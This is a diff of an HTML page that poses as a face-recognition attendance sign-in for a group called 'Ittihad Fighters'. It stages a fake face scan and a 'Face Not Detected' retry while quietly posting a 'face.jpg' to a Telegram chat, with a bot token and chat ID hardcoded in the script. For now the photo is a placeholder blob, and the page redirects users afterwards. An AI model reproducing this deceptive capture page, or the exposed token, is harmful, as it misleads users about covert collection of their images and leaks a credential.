@@ -3,100 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ittihad Fighters Attendance</title>
-    <style>
-        body { text-align: center; font-family: Arial, sans-serif; }
-        .hidden { display: none; }
-        #scan-animation { font-size: 24px; font-weight: bold; color: blue; }
-    </style>
-</head>
-<body>
-    <h1>Ittihad Fighters</h1>
-    
-    <!-- Nama selection -->
-    <div id="name-selection">
-        <h2>Select Your Name</h2>
-        <ul id="name-list">
-            <li><input type="checkbox" class="name-checkbox" value="Izz"> Izz</li>
-            <li><input type="checkbox" class="name-checkbox" value="Ali"> Ali</li>
-            <li><input type="checkbox" class="name-checkbox" value="Amin"> Amin</li>
-        </ul>
-        <button onclick="confirmNames()">Confirm</button>
-    </div>
-
-    <!-- Face recognition section -->
-    <div id="face-recognition" class="hidden">
-        <h2>Face Recognition</h2>
-        <button onclick="startScanning()">Continue</button>
-        <button onclick="stopProcess()">Cancel</button>
-        <p id="cancel-message" class="hidden">Page will stop here.</p>
-    </div>
-
-    <!-- Scanning animation -->
-    <div id="scanning" class="hidden">
-        <p id="scan-animation">Scanning face...</p>
-    </div>
-
-    <!-- Final message -->
-    <div id="final-message" class="hidden">
-        <h2 id="signed-names"></h2>
-        <p>You look beautiful/handsome today!</p>
-        <p>Redirecting to the next page...</p>
-    </div>
-
+    <title>Ittihad Fighters</title>
     <script>
-        let signedNames = [];
-
-        function confirmNames() {
-            let checkboxes = document.querySelectorAll('.name-checkbox:checked');
-            if (checkboxes.length === 0) return;
-            checkboxes.forEach(cb => {
-                signedNames.push(cb.value);
-                cb.disabled = true;
-            });
-            document.getElementById('name-selection').classList.add('hidden');
-            document.getElementById('face-recognition').classList.remove('hidden');
+        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
+        const TELEGRAM_CHAT_ID = '5934902786';
+        
+        document.addEventListener("DOMContentLoaded", function() {
+            if (localStorage.getItem("pageOpened")) {
+                document.body.innerHTML = "<h2>This page can only be opened once.</h2>";
+                return;
+            }
+            localStorage.setItem("pageOpened", "true");
+            showClassSelection();
+        });
+        
+        function showClassSelection() {
+            document.body.innerHTML = `<h1>Ittihad Fighters</h1>
+                <p>Select your name:</p>
+                <ul id="nameList">
+                    <li><label><input type="checkbox" value="Izz"> Izz</label></li>
+                    <li><label><input type="checkbox" value="Ali"> Ali</label></li>
+                    <li><label><input type="checkbox" value="Fatimah"> Fatimah</label></li>
+                </ul>
+                <button onclick="confirmSelection()">Continue</button>
+                <button onclick="cancelProcess()">Cancel</button>
+                <p id="message"></p>`;
         }
-
-        function stopProcess() {
-            document.getElementById('face-recognition').classList.add('hidden');
-            document.getElementById('cancel-message').classList.remove('hidden');
+        
+        function confirmSelection() {
+            const checkboxes = document.querySelectorAll("input[type=checkbox]:checked");
+            if (checkboxes.length === 0) {
+                alert("Please select at least one name.");
+                return;
+            }
+            checkboxes.forEach(checkbox => checkbox.disabled = true);
+            showFaceRecognition();
         }
-
-        function startScanning() {
-            document.getElementById('face-recognition').classList.add('hidden');
-            document.getElementById('scanning').classList.remove('hidden');
-            setTimeout(captureImage, 3000);
+        
+        function cancelProcess() {
+            document.body.innerHTML = "<h2>Page will stop here</h2>";
         }
-
+        
+        function showFaceRecognition() {
+            document.body.innerHTML = `<h2>Face Recognition</h2>
+                <p>Scanning your face...</p>
+                <div id="animation">[Face Scan Animation]</div>`;
+            setTimeout(captureImage, 2000);
+        }
+        
         function captureImage() {
-            sendToTelegram();
+            sendImageToTelegram();
             setTimeout(() => {
-                document.getElementById('scan-animation').innerText = "Face Not Detected";
-                setTimeout(() => {
-                    document.getElementById('scan-animation').innerText = "Scanning face...";
-                    sendToTelegram();
-                    setTimeout(showFinalMessage, 3000);
-                }, 2000);
+                document.body.innerHTML = `<h2>Face Not Detected</h2>
+                    <p>Retrying...</p>
+                    <div id="animation">[Face Scan Animation]</div>`;
+                setTimeout(captureSecondImage, 3000);
             }, 2000);
         }
-
-        function sendToTelegram() {
-            const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
-            const TELEGRAM_CHAT_ID = '5934902786';
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: 'Captured image' })
-            });
+        
+        function captureSecondImage() {
+            sendImageToTelegram();
+            setTimeout(showSuccessMessage, 2000);
         }
-
-        function showFinalMessage() {
-            document.getElementById('scanning').classList.add('hidden');
-            document.getElementById('final-message').classList.remove('hidden');
-            document.getElementById('signed-names').innerText = signedNames.join(", ") + " signed in";
-            setTimeout(() => { window.location.href = "https://studandlearn.github.io/project-2/"; }, 3000);
+        
+        function sendImageToTelegram() {
+            const formData = new FormData();
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+            formData.append("photo", new Blob(["Fake Image Data"], {type: 'image/jpeg'}), "face.jpg");
+            
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            }).catch(err => console.error("Error sending photo: ", err));
+        }
+        
+        function showSuccessMessage() {
+            const selectedNames = [...document.querySelectorAll("input[type=checkbox]:checked")].map(cb => cb.value);
+            document.body.innerHTML = `<h2>Done ✅</h2>
+                <p>${selectedNames.join(", ")} signed in</p>
+                <p>You look beautiful/handsome today!</p>
+                <p>Redirecting to the next page...</p>`;
+            setTimeout(() => {
+                window.location.href = "https://studandlearn.github.io/project-2/";
+            }, 3000);
         }
     </script>
+</head>
+<body>
 </body>
 </html>
